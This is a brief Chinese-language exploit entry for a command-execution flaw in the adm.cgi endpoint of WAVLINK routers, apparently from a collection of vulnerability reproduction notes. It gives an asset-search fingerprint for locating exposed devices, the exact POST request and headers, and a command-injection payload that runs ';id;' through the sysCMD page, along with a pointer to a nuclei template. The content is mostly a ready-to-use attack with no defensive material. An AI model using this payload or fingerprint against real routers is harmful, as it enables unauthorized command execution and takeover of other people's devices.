# WAVLINKadm.cgi命令执行漏洞

- **系统**：WAVLINKadm　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`web.body="firstFlage"`
- **请求**：`POST /cgi-bin/adm.cgi HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 26`

**请求体 / payload**
```
page=sysCMD&command=";id;"

nuclei脚本\
\[wanlink-router-adm-cgi-rce.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- WAVLINK adm.cgi命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * wavlink 路由器